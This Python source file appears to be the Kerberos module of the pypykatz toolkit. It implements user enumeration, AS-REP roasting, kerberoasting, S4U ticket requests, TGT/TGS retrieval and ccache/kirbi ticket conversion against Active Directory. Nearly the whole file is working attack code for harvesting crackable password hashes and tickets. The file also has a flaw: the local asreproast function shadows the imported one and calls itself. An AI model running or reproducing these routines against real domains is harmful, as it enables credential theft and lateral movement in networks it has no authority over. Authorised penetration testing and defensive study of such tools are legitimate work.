
from pypykatz import logger
import os
import ntpath
import glob

from minikerberos.security import krb5userenum, asreproast, kerberoast
from minikerberos.common.factory import KerberosClientFactory
from minikerberos.common.spn import KerberosSPN
from minikerberos.common.creds import KerberosCredential
from minikerberos.common.target import KerberosTarget
from minikerberos.common.keytab import Keytab
from minikerberos.aioclient import AIOKerberosClient
from minikerberos.common.utils import print_table
from minikerberos.common.ccache import CCACHE, Credential
from minikerberos.common.kirbi import Kirbi


def process_target_line(target, realm = None, to_spn = True):
	spn = KerberosSPN()
	if to_spn is False:
		spn = KerberosCredential()
	line = target.strip()
	if line == '':
		return None
	m = line.find('@')
	if m == -1:
		if realm is not None:
			spn.username = line
			spn.domain = realm
		else:
			raise Exception('User %s is missing realm specification and no global realm is defined!' % line)
					
	else:
		spn.username, spn.domain = line.split('@',1)
		if realm is not None:
			spn.domain = realm

	return spn

def generate_targets(targets, realm = None, to_spn = True):
	"""
	Takes a list of files or strings and generates a list of targets in <username>@<realm> format
	"""
	results = []
	for target in targets:
		target = target.strip()
		try:
			if '../' in target or '..\\' in target:
				raise Exception('Invalid file path')
			open(target, 'r')
		except:
			x = process_target_line(target, realm = realm, to_spn = to_spn)
			if x:
				results.append(x)
		else:
			if '../' in target or '..\\' in target:
				raise Exception('Invalid file path')
			with open(target, 'r') as f:
				for line in f:
					x = process_target_line(line, realm = realm, to_spn = to_spn)
					if x:
						results.append(x)
	return results

def process_keytab(keytablfile):
	if '../' in keytablfile or '..\\' in keytablfile:
		raise Exception('Invalid file path')
	with open(keytablfile, 'rb') as f:
		kt = Keytab.from_bytes(f.read())
		print(str(kt))

def list_ccache(ccachefile):
	cc = CCACHE.from_file(ccachefile)
	table = []
	table.append(['id'] + Credential.summary_header())
	i = 0
	for cred in cc.credentials:
		table.append([str(i)] + cred.summary())
		i += 1
	print()	#this line intentionally left blank
	print_table(table)

def roast_ccache(ccachefile, outfile = None):
	cc = CCACHE.from_file(ccachefile)
	if outfile:
		if '../' in outfile or '..\\' in outfile:
			raise Exception('Invalid file path')
		with open(outfile, 'wb') as f:
			for h in cc.get_hashes(all_hashes = True):
				f.write(h.encode() + b'\r\n')
	else:
		for h in cc.get_hashes(all_hashes = True):
			print(h)

def del_ccache(ccachefile, index):
	output_filename = os.path.join(os.path.dirname(os.path.abspath(ccachefile)), '%s.edited.ccache' % ntpath.basename(ccachefile)) #sorry for this, im tired now :(
	cc = CCACHE.from_file(ccachefile)
	temp_cc = CCACHE()
	temp_cc.file_format_version = cc.file_format_version
	temp_cc.headerlen = cc.headerlen
	temp_cc.headers = cc.headers
	temp_cc.primary_principal = cc.primary_principal

	for i, cred in enumerate(cc.credentials):
		if i == index:
			continue
			
		temp_cc.credentials.append(cred)

	logger.info('Writing edited file to %s' % output_filename)
	temp_cc.to_file(output_filename)

def ccache_to_kirbi(ccachefile, kirbidir):
	cc = CCACHE.from_file(ccachefile)
	logger.info('Extracting kirbi file(s)')
	cc.to_kirbidir(kirbidir)
	logger.info('Done!')

def kirbi_to_ccache(ccachefile, kirbi):
	try:
		cc = CCACHE.from_file(ccachefile)
	except FileNotFoundError:
		cc = CCACHE()
	
	abs_path = os.path.abspath(kirbi)
	if os.path.isdir(abs_path):
		logger.info('Parsing kirbi files in directory %s' % abs_path)
		for kirbifile in glob.glob(kirbi + '*.kirbi'):
			cc.add_kirbi(kirbifile)
	else:
		cc.add_kirbi(kirbi)
	
	cc.to_file(ccachefile)

async def get_TGS(url, spn, out_file = None, override_etype = None):
	try:
		logger.debug('[KERBEROS][TGS] started')
		if isinstance(override_etype, int):
			override_etype = [override_etype]

		ku = KerberosClientFactory.from_url(url)
		spn = KerberosSPN.from_user_email(spn)

		logger.debug('[KERBEROS][TGS] target user: %s' % spn.get_formatted_pname())
		logger.debug('[KERBEROS][TGS] fetching TGT')
		kcomm = ku.get_client()
		await kcomm.get_TGT()
		logger.debug('[KERBEROS][TGS] fetching TGS')
		tgs, encTGSRepPart, key = await kcomm.get_TGS(spn, override_etype=override_etype)

		kirbi = Kirbi.from_ticketdata(tgs, encTGSRepPart)
		if out_file is not None:
			kirbi.to_file(out_file)

		logger.debug('[KERBEROS][TGS] done!')
		return tgs, encTGSRepPart, key, kirbi, None
	except Exception as e:
		return None, None, None, None, e

async def get_TGT(url, override_etype = None):
	try:
		logger.debug('[KERBEROS][TGT] started')
		if isinstance(override_etype, int):
			override_etype = [override_etype]
		ku = KerberosClientFactory.from_url(url)
		cred = ku.get_creds()
		target = ku.get_target()

		logger.debug('[KERBEROS][TGT] cred: %s' % cred)
		logger.debug('[KERBEROS][TGT] target: %s' % target)

		kcomm = AIOKerberosClient(cred, target)
		logger.debug('[KERBEROS][TGT] fetching TGT')
		await kcomm.get_TGT(override_etype=override_etype)
		
		kirbi = Kirbi.from_ticketdata(kcomm.kerberos_TGT, kcomm.kerberos_TGT_encpart)
		return kirbi, None
	except Exception as e:
		return None, e

async def brute(host, targets, out_file = None, show_negatives = False):
	"""
	targets List<KerberosSPN>

	"""
	try:
		logger.debug('[KERBEROS][BRUTE] User enumeration starting')
		target = KerberosTarget(host)

		enumusers = [x.username for x in targets]
		realm = targets[0].realm

		async for username, result, _, err in krb5userenum(target, enumusers, realm):
			if err is not None:
				continue
			if result is True:
				if out_file:
					if '../' in out_file or '..\\' in out_file:
						raise Exception('Invalid file path')
					with open(out_file, 'a') as f:
						f.write(username + '\r\n')
				else:
					print('[+] Enumerated user: %s' % str(username))

		logger.info('[KERBEROS][BRUTE] User enumeration finished')
		return None, None
	except Exception as e:
		return None, e


async def asreproast(host, targets, out_file = None, etype = 23):
	"""
	targets List<KerberosSPN>

	"""
	try:
		logger.debug('[KERBEROS][ASREPROAST] Roasting...')
		logger.debug('[KERBEROS][ASREPROAST] Supporting the following encryption type: %s' % (str(etype)))

		usernames = [x.username for x in targets]
		domain = targets[0].domain

		ks = KerberosTarget(host)
		hashes = []
		async for _, h, err in asreproast(ks, usernames, domain, etype):
			if h is not None:
				hashes.append(str(h))

		if out_file:
			if '../' in out_file or '..\\' in out_file:
				raise Exception('Invalid file path')
			with open(out_file, 'a', newline = '') as f:
				for thash in hashes:
					f.write(thash + '\r\n')
		else:
			print(h)

		logger.info('[KERBEROS][ASREPROAST] Done!')
		return hashes, None
		
	except Exception as e:
		return None, e

async def spnroast(url, targets, out_file = None, etype = 23):
	"""
	targets List<KerberosSPN>

	"""
	try:
		logger.debug('[KERBEROS][SPNROAST] Roasting...')
		if etype:
			if etype == -1:
				etypes = [23, 17, 18]
			else:
				etypes = [etype]
		else:
			etypes = [23, 17, 18]

		logger.debug('[KERBEROS][SPNROAST] Using the following encryption type(s): %s' % (','.join(str(x) for x in etypes)))
		
		ktargets = [x.username for x in targets]
		kdomain = targets[0].domain
		ku = KerberosClientFactory.from_url(url)
		hashes = []
		async for username,h, err in kerberoast(ku, ktargets, kdomain, etypes):
			hashes.append(h)
		
		if out_file:
			if '../' in out_file or '..\\' in out_file:
				raise Exception('Invalid file path')
			with open(out_file, 'w', newline = '') as f:
				for thash in hashes:
					f.write(thash + '\r\n')

		else:
			for thash in hashes:
				print(thash)

		logger.info('[KERBEROS][SPNROAST] Done!')
		return hashes, None
		
	except Exception as e:
		return None, e

async def s4u(url, spn, targetuser):
	try:
		logger.debug('[KERBEROS][S4U] Started')
		cu = KerberosClientFactory.from_url(url)
		ccred = cu.get_creds()
		target = cu.get_target()

		service_spn = KerberosSPN.from_target_string(spn)
		target_user = KerberosSPN.from_user_email(targetuser)
			
		if not ccred.ccache:
			logger.debug('[KERBEROS][S4U] Getting TGT')
			client = AIOKerberosClient(ccred, target)
			await client.get_TGT()
			logger.debug('[KERBEROS][S4U] Getting ST')
			res = await client.getST(target_user, service_spn)
			tgs, encTGSRepPart, key = res
		else:
			logger.debug('[KERBEROS][S4U] Getting TGS via TGT from CCACHE')
			for tgt, key in ccred.ccache.get_all_tgt():
				try:
					logger.debug('[KERBEROS][S4U] Trying to get SPN with %s' % '!'.join(tgt['cname']['name-string']))
					client = AIOKerberosClient.from_tgt(target, tgt, key)

					res = await client.getST(target_user, service_spn)
					tgs, encTGSRepPart, key = res
					logger.debug('[KERBEROS][S4U] Sucsess!')
				except Exception as e:
					logger.debug('[KERBEROS][S4U] This ticket is not usable it seems Reason: %s' % e)
					continue
				else:
					break

		logger.debug('[KERBEROS][S4U] Done!')
		kirbi = Kirbi.from_ticketdata(tgs, encTGSRepPart)
		return tgs, encTGSRepPart, key, kirbi, None

	except Exception as e:
		return None, None, None, None, e
